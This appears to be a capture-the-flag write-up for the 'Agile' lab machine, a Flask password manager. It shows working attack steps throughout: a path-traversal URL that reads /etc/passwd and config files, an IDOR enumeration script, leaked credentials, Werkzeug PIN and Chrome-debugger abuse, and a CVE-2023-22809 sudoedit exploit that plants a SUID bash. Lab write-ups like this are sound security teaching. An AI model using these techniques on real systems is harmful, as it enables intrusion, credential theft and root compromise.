## the box

Agile is a Linux box running `superpass.htb`, a Flask password-manager app behind nginx on port 80, plus SSH. The app stores user vault entries and exports them as CSV. Standard two-port surface, all the action in the web app.

## recon

Port 80 and 22, nginx 1.18.0 serving the Flask app, OpenSSH 8.9p1 on 22. The app runs under Gunicorn with a `wsgi_app` module and Flask is left in debug mode. Directory enumeration showed the interesting routes redirect to login.

```
/download   (Status: 302) [--> /account/login?next=%2Fdownload]
/vault      (Status: 302) [--> /account/login?next=%2Fvault]
```

I registered a normal user and logged in. The vault export feature builds a CSV and redirects to `/download?fn=<file>`. Intercepting that in Burp showed the download handler reads straight off the filesystem.

## foothold

The `download` view opens `/tmp/{fn}` with no sanitization on `fn`:

```python
@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
```

So `fn` traverses out of `/tmp`:

```
/download?fn=../../../etc/passwd
```

That dumped `/etc/passwd`, giving me `corum`, `edwards`, and `dev_admin` as real users. The same vault blueprint had an IDOR: `/vault/row/<id>` and `/vault/edit_row/<id>` fetch a password by id, but the ownership check compared the row's `User.id` instead of `Password.userid`, so any authenticated user could pull any row. The ids are enumerable. I scripted iterating ids 0 to 10 as a low-priv user and scraping the returned table cells.

```python
session.post(target + "/account/login", data={"username":"tester","password":"tester","submit":""})
for id in range(0,10):
    request = session.get(target + "/vault/row/" + str(id))
    # parse <tr class="password-row"> cells: sitename, username, password
```

That leaked `corum:5db7caa1d13cc37c9fc2`, which worked over SSH.

Two other footholds existed. Because Flask was in debug mode, the same `fn` traversal that read `/etc/passwd` could read `/sys/class/net/eth0/address`, `/etc/machine-id`, and `/proc/self/cgroup`, which is enough to reconstruct the Werkzeug console PIN and run code through the interactive debugger. The PIN reconstruction has to use the module name `wsgi_app` (the Gunicorn entry), not `Flask`. The cleaner credential source was `/app/config_prod.json`, which held the MySQL URI `mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass`; querying the `passwords` table dumps every vault row directly. The IDOR path above reaches the same data without DB creds.

## user

SSH as corum landed the shell and the user flag. Enumerating, I found a second nginx vhost for `test.superpass.htb` proxying to a dev instance on port 5555:

```
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;
    location / {
        proxy_pass http://127.0.0.1:5555;
    }
}
```

The test instance was driven by a headless Chrome started with remote debugging:

```
/opt/google/chrome/chrome --type=renderer --headless --remote-debugging-port=41829 ...
```

With the debugger port open I could attach to the running Chrome, drive it to log into the test app, and read the autofilled vault. That gave `edwards:d07867c6267dcb5df0af`. SSH as edwards.

## root

edwards had a narrow sudoedit grant:

```
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

sudo was `1.9.9`, vulnerable to CVE-2023-22809. The `EDITOR` variable accepts `--` and an extra file argument, letting sudoedit open a file outside the allowed list. Root sourced `/app/venv/bin/activate`, both from `/etc/bash.bashrc` on login and from a cron job:

```
CMD: UID=0  | /bin/bash -c source /app/venv/bin/activate
```

So I pointed sudoedit at that activate script, which I could not normally edit, and appended a SUID line:

```bash
export EDITOR='vim -- /app/venv/bin/activate'
sudo -u dev_admin sudoedit /app/config_test.json
# add to activate: chmod u+s /bin/bash
```

When root next ran the cron and sourced the file, `/bin/bash` became SUID. `bash -p` gave a root shell and the root flag.

## takeaway

Two app-level bugs (no path sanitization on a download param, enumerable vault rows) chained into a foothold, and a sudoedit CVE turned a write into root because root was sourcing an attacker-controllable file.
